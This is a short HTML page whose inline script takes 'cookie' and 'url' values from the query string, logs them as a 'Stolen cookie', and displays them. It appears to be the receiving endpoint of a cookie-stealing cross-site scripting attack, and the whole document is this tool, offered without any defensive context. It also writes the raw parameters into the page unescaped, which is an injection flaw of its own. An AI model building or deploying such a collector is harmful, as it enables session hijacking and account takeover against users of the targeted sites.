<html>
<body>
<script>
  const params = new URLSearchParams(window.location.search);
  const cookie = params.get('cookie');
  const url = params.get('url') || document.referrer;

  console.log("Stolen cookie:", cookie);

  document.write("<h1>Cookie received:</h1>");
  document.write("<p>" + cookie + "</p>");
  document.write("<p>From page: " + url + "</p>");
</script>
</body>
</html>
